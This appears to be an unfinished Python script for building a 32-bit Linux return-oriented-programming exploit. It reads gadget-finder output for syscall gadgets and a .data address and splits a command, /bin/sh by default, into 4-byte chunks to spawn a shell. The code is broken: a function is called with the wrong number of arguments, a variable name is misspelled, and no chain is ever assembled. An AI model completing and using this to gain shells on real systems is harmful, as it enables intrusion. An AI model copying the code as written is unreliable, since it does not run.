#!/usr/bin/env python3

import re
import argparse
from pathlib import Path


parser = argparse.ArgumentParser(
    description = "",
    formatter_class = argparse.ArgumentDefaultsHelpFormatter,
)
parser.add_argument("--command", default = "/bin/sh")
parser.add_argument("--envp", default = None)
parser.add_argument("--out-rop-path", default = None)

def main(args):
    argv = args.command.split()
    #envp = args.envp.split()

    push_array_of_strings(argv)

    gadgets, data_address = parse_out_rop(Path(args.out_rop_path))

    #push_array_of_strings(argv)
    #push_array_of_strings(envp)
    

# Available gadgets
# .data stack base pointer
# .data stack pointer


def parse_out_rop(path: Path):
    rop_gadgets = {
        ": mov dword ptr [edx], eax ; ret": None,
        ": pop edx ; ret": None,
        ": pop eax ; ret": None,
        ": xor eax, eax ; ret": None,
        ": inc eax ; ret": None,
        ": pop ebx ; ret": None,
        ": pop ecx ; pop ebx ; ret": None,
        ": int 0x80": None,
    }

    data_address = None
    data_addrPat = re.compile(r",\s*([^)]*)")

    with open(path) as out_rop:
        for line in out_rop:
            if ".data" in line and data_address is None:
                match = data_addrPat.search(line)
                if match:
                    extracted_part = match.group(1)
                    data_address = extracted_part

            elif any(gadget in line for gadget in rop_gadgets.keys()):
                tokens = line.split()
                gadget_key = ' '.join(tokens[1:])
                rop_gadgets[gadget_key] = tokens[0]

    return rop_gadgets, data_address

def push_array_of_strings(array, rop_gadgets):
    for string in array:
        chunks = [string[i:i+4] for i in range(0, len(string), 4)]
        chunks = [chunk.ljust(4, '\0') for chunk in chsunks]

        for chunk in chunks:
            print(chunk)

if __name__ == "__main__":
    main(parser.parse_args())